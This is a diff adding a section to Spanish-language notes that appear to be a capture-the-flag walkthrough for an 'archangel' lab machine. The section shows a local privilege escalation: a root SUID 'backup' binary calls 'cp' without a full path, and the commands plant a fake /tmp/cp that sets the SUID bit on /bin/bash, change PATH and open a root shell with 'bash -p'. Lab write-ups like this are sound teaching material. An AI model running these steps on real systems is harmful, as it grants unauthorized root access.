@@ -160,3 +160,30 @@ Paso 3: Desde la máquina víctima
 ❯ bash -p       # Obtener la consola bash con privilegios
 ```
 
+## backup
+```bash 
+-rwsr-xr-x 1 root root    /home/archangel/secret/backup
+
+❯ /home/archangel/secret/backup
+# Lo que se ve es que llama a 'CP' sin ruta absoluta
+	cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+
+Paso 1: Hacer un 'Path Hijacking'
+# Creas el cp falso en /tmp
+❯ echo '#!/bin/bash' > /tmp/cp
+❯ echo 'chmod +s /bin/bash' >> /tmp/cp
+❯ chmod +x /tmp/cp
+
+Paso 2:
+# Modificas el PATH
+❯ export PATH=/tmp:$PATH
+
+Paso 3:
+❯ /home/archangel/secret/backup
+
+Paso 4:
+# Escalas
+❯ /bin/bash -p
+❯ whoami
+```
+
